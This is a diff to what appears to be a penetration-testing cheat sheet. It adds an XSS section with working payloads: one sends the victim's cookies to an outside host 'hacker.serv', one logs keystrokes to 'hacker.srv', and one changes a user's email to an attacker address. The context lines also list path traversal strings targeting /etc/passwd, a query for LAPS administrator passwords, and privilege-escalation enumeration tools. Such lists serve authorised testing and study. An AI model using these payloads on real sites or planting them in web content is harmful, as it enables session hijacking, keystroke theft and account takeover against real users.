@@ -40,6 +40,13 @@ curl <hostname> -I                                                              
 curl <hostname> -v                                                                 # Verbose mode with header
 curl http://site.com/images/favico.ico | md5sum                                    # Get hash of the favicon site and when chek it on the OWASP DB (see 1 note)
 
+#######################         XSS          #######################################
+
+<script>alert('XSS');</script>                                                     # XSS Check
+<script>fetch('https://hacker.serv/st?cookie=' + btoa(document.cookie));</script>  # Steal cookie
+<script>document.onkeypress = function(e) {fetch('https://hacker.srv/log?key='+btoa(e.key));}</script> # Key loggin steal
+<script>user.changeEmail('hacker@mail');</script>                                  # Use document script for xss
+
 ########################### Path traversal #########################################
 
 ../../../../etc/passw                                                              # Path traversal for Linux
@@ -60,7 +67,7 @@ net user <username>                                                             
 Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
 winpeas.exe                                                                        # check current vector of piv
 
-########################         lin          #######################################
+~~~~~~~~~~~~~~~~~~~~~~~~         lin          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 sudo -l                                                                            # check aviable commands & permisions
 linpeas.sh                                                                         # check aviable commands & permisions
 pspy64                                                                             # check aviable commands & permisions
